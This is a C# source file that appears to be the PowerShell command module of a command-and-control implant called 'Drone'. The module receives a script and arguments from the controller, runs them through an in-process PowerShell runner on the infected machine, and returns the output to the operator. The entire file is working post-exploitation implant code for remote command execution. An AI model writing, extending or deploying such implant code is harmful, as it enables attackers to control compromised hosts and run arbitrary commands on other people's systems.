using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class PowerShell : DroneCommand
{
    public override byte Command => 0x10;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var runner = new PowerShellRunner();

        string script = null;
        
        // if task has a script, ignore imported scripts
        if (task.Artefact is not null && task.Artefact.Length > 0)
        {
            script = Encoding.ASCII.GetString(task.Artefact);
        }
        else if(!string.IsNullOrWhiteSpace(PowerShellImport.ImportedScript))
        {
            script = PowerShellImport.ImportedScript;
        }

        if (!string.IsNullOrWhiteSpace(script))
        {
            if (script.StartsWith("?"))
                script = script.Remove(0, 3);
            
            runner.ImportScript(script);
        }

        var command = string.Join(" ", task.Arguments);
        var result = runner.Invoke(command);
            
        await Drone.SendOutput(task, result);
    }
}